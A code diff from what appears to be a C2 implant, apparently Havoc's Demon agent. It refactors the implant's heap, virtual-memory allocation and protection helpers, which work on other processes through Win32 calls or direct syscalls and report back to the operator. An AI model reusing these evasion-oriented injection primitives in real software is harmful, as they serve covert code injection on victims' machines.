@@ -15,7 +15,7 @@
 PVOID MmHeapAlloc(
     _In_ ULONG Length
 ) {
-    return Instance->Win32.RtlAllocateHeap( NtProcessHeap(), HEAP_ZERO_MEMORY, Length );
+    return ((INSTANCE *)Instance)->Win32.RtlAllocateHeap( NtProcessHeap(), HEAP_ZERO_MEMORY, Length );
 }
 
 /*!
@@ -32,7 +32,7 @@ PVOID MmHeapReAlloc(
     _In_ PVOID Memory,
     _In_ ULONG Length
 ) {
-    return Instance->Win32.RtlReAllocateHeap( NtProcessHeap(), HEAP_ZERO_MEMORY, Memory, Length );
+    return ((INSTANCE *)Instance)->Win32.RtlReAllocateHeap( NtProcessHeap(), HEAP_ZERO_MEMORY, Memory, Length );
 }
 
 /*!
@@ -48,7 +48,7 @@ PVOID MmHeapReAlloc(
 BOOL MmHeapFree(
     _In_ PVOID Memory
 ) {
-    return Instance->Win32.RtlFreeHeap( NtProcessHeap(), 0, Memory );
+    return ((INSTANCE *)Instance)->Win32.RtlFreeHeap( NtProcessHeap(), 0, Memory );
 }
 
 /*!
@@ -69,7 +69,7 @@ PVOID MmVirtualAlloc(
     PVOID    Memory   = NULL;
     NTSTATUS NtStatus = STATUS_SUCCESS;
 
-    if ( Instance->Config.Implant.Verbose && ( Methode != DX_MEM_DEFAULT ) ) {
+    if ( ((INSTANCE *)Instance)->Config.Implant.Verbose && ( Methode != DX_MEM_DEFAULT ) ) {
         Package = PackageCreate( DEMON_INFO );
         PackageAddInt32( Package, DEMON_INFO_MEM_ALLOC );
     }
@@ -77,8 +77,8 @@ PVOID MmVirtualAlloc(
     switch ( Methode )
     {
         case DX_MEM_DEFAULT: PUTS( "DX_MEM_DEFAULT" ) {
-            Memory = Instance->Config.Memory.Alloc != DX_MEM_DEFAULT ?
-                     MmVirtualAlloc( Instance->Config.Memory.Alloc, Process, Size, Protect ) :  // if the config memory alloc ain't default then use that
+            Memory = ((INSTANCE *)Instance)->Config.Memory.Alloc != DX_MEM_DEFAULT ?
+                     MmVirtualAlloc( ((INSTANCE *)Instance)->Config.Memory.Alloc, Process, Size, Protect ) :  // if the config memory alloc ain't default then use that
                      MmVirtualAlloc( DX_MEM_SYSCALL, Process, Size, Protect );                 // if it is default then simply choose Native/Syscall
 
             return Memory;
@@ -86,7 +86,7 @@ PVOID MmVirtualAlloc(
 
         case DX_MEM_WIN32: {
             PRINTF( "VirtualAllocEx( %x, NULL, %ld, %ld, %ld ) => ", Process, Size, MEM_RESERVE | MEM_COMMIT, Protect );
-            Memory = Instance->Win32.VirtualAllocEx( Process, NULL, Size, MEM_RESERVE | MEM_COMMIT, Protect );
+            Memory = ((INSTANCE *)Instance)->Win32.VirtualAllocEx( Process, NULL, Size, MEM_RESERVE | MEM_COMMIT, Protect );
             PRINTF( "%p\n", Memory )
             break;
         }
@@ -94,7 +94,7 @@ PVOID MmVirtualAlloc(
         case DX_MEM_SYSCALL: {
             if ( ! NT_SUCCESS( NtStatus = SysNtAllocateVirtualMemory( Process, &Memory, 0, &Size, MEM_COMMIT | MEM_RESERVE, Protect ) ) ) {
                 PRINTF( "[-] NtAllocateVirtualMemory: Failed:[%lx]\n", NtStatus )
-                NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                NtSetLastError( ((INSTANCE *)Instance)->Win32.RtlNtStatusToDosError( NtStatus ) );
                 Memory = NULL;
             }
 
@@ -108,7 +108,7 @@ PVOID MmVirtualAlloc(
 
     PRINTF( "Memory:[%p] MemSize:[%d]\n", Memory, Size );
 
-    if ( Memory && Instance->Config.Implant.Verbose ) {
+    if ( Memory && ((INSTANCE *)Instance)->Config.Implant.Verbose ) {
         Package = PackageCreate( DEMON_INFO );
         PackageAddInt32( Package, DEMON_INFO_MEM_ALLOC );
         PackageAddPtr( Package, Memory );
@@ -145,21 +145,21 @@ BOOL MmVirtualProtect(
     switch ( Method )
     {
         case DX_MEM_DEFAULT: PUTS( "DX_MEM_DEFAULT" ) {
-            if ( Instance->Config.Memory.Alloc != DX_MEM_DEFAULT ) {
-                return MmVirtualProtect( Instance->Config.Memory.Alloc, Process, Memory, Size, Protect );
+            if ( ((INSTANCE *)Instance)->Config.Memory.Alloc != DX_MEM_DEFAULT ) {
+                return MmVirtualProtect( ((INSTANCE *)Instance)->Config.Memory.Alloc, Process, Memory, Size, Protect );
             } else {
                 return MmVirtualProtect( DX_MEM_SYSCALL, Process, Memory, Size, Protect );
             }
         }
 
         case DX_MEM_WIN32: {
-            Success = Instance->Win32.VirtualProtectEx( Process, Memory, Size, Protect, &OldProtect );
+            Success = ((INSTANCE *)Instance)->Win32.VirtualProtectEx( Process, Memory, Size, Protect, &OldProtect );
             break;
         }
 
         case DX_MEM_SYSCALL: {
             if ( ! NT_SUCCESS( NtStatus = SysNtProtectVirtualMemory( Process, &Memory, &Size, Protect, &OldProtect ) ) ) {
-                NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
+                NtSetLastError( ((INSTANCE *)Instance)->Win32.RtlNtStatusToDosError( NtStatus ) );
             } else {
                 Success = TRUE;
             }
@@ -172,7 +172,7 @@ BOOL MmVirtualProtect(
         }
     }
 
-    if ( Success && Instance->Config.Implant.Verbose ) {
+    if ( Success && ((INSTANCE *)Instance)->Config.Implant.Verbose ) {
         Package = PackageCreate( DEMON_INFO );
         PackageAddInt32( Package, DEMON_INFO_MEM_PROTECT );
         PackageAddPtr( Package, Memory );
